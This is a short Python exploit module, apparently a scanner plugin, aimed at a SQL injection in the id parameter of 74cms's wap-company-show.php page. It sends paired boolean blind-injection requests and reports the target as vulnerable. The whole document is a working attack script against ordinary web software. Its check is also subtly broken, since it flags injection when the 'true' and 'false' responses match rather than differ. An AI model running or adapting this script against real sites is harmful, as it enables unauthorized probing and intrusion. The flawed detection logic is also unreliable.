# refer :http://www.wooyun.org/bugs/wooyun-2014-082539
# 74cms /wap/wap-company-show.php?id=[sql注入]
import requests
import re


class Exploit:

    def attack(self, url):
        true_url = url + '/wap/wap-company-show.php?id=1%20and%20ascii(substring((md5(0x11)),1,1))=52'  # true
        false_url = url + '/wap/wap-company-show.php?id=1%20and%20ascii(substring((md5(0x11)),1,1))=53'  # false
        r1 = requests.get(true_url)
        r2 = requests.get(false_url)
        if r1.status_code == 200 and r2.status_code == 200:
            if re.search(r'url="wap-jobs-show.php?id=1"', r1.text) and re.search(r'url="wap-jobs-show.php?id=1"',
                                                                                 r2.text):
                return true_url + " has SQL Injection..."